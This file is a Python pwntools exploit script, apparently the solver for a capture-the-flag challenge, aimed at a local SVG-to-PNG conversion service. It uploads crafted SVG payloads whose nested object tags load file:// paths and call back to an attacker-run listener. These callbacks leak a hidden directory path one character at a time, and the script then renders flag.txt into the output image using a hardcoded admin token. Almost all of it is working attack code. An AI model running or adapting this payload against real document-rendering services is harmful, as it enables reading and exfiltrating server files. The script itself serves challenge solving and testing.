#!/usr/bin/env python3
from pwn import *
import requests
import hashlib
import time

# runs in ~80s :/

context.log_level = 9999

SECRET="ac70b2afb26c77b9a15f"
SESS = requests.Session()
assert SESS.get("http://127.0.0.1:1337/").status_code == 200
SID = SESS.cookies.get_dict()["connect.sid"]
SID = SID.split("%3A")[1].split(".")[0]

FLAG_PATH = f"/app/sessions/{SID}/flag/"
DIR_COUNT = 0
DIR_MAX = 10 # flag 10 dirs deep e.g. 0/1/2/3/4.../9/flag.txt

HEX_CHARS = list('0123456789abcdef')

FNAME = "payload.svg"
FHASH = hashlib.sha256(FNAME.encode()).hexdigest()
# 50cc981d7588ce02611f841b19e63e8f925a909ac0a2423c870fe330b2e2b532

UNSEEN = set(HEX_CHARS)

def handle_conn(c):
    global UNSEEN, FLAG_PATH, DIR_COUNT
    http_header = c.readline() # e.g. GET /?1 HTTP/1.1
    char = http_header.split(b"?")[1].split(b" ")[0]
    char = char.decode()
    assert char in UNSEEN
    UNSEEN.remove(char)
    # print(f"not {FLAG_PATH}{char}")
    if len(UNSEEN) == 1:
        FLAG_PATH += f"{UNSEEN.pop()}/"
        print(FLAG_PATH)
        DIR_COUNT += 1
        UNSEEN = set(HEX_CHARS)
        next_stage()
    c.send(b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: close\r\n\r\n")
    c.close()

def gen_payload():
    payload = f"""
    <svg width="960" height="850">
    <foreignObject x="10" y="10" width="800" height="800">
    <body xmlns="http://www.w3.org/1999/xhtml">
    """
    if DIR_COUNT == DIR_MAX:
        payload += f"""
        <p>flag:</p>
        <object data="file://{FLAG_PATH}flag.txt"></object>
        """
    else:
        for char in HEX_CHARS:
            payload += f"""
            <object height="1" width="1" data="file://{FLAG_PATH}{char}">
                <object height="1" width="1" data="http://127.0.0.1:{SRV.lport}?{char}"></object>
            </object>
            """
        payload += f"""
        <meta http-equiv="refresh" content="0;URL='file:///app/sessions/{SID}/uploads/{FHASH}.svg'"/> 
        """
    payload += """
    </body>
    </foreignObject>
    </svg>
    """
    return payload


def next_stage():
    print(f"generating payload {DIR_COUNT}")
    payload = gen_payload()
    res = SESS.post("http://127.0.0.1:1337/upload", files={'svg': (FNAME, payload)}).json()
    assert res["id"] == FHASH

SRV = server(typ="tcp", callback=handle_conn)
next_stage()
SESS.post("http://127.0.0.1:1337/convert", data={"id": FHASH}, headers={"X-ADMIN-TOKEN": SECRET})


res = SESS.get(f"http://127.0.0.1:1337/convert/{FHASH}")
assert "still processing" in res.text

while DIR_COUNT < DIR_MAX:
    pass

print("waiting for svg conversion to finish...")
time.sleep(60)
res = SESS.get(f"http://127.0.0.1:1337/convert/{FHASH}")
assert res.headers["Content-Type"] == "image/png"
sha256 = hashlib.sha256(res.content).hexdigest()
print(sha256)
# is the screenshot deterministic? seems like it so far, but maybe not
# no idea how to check the output better if it's non-deterministic
assert sha256 == "09aea16de3b61f48802c47ee10937af4f8e7afce42eacabd3de6030088fbffc0"
exit(0)
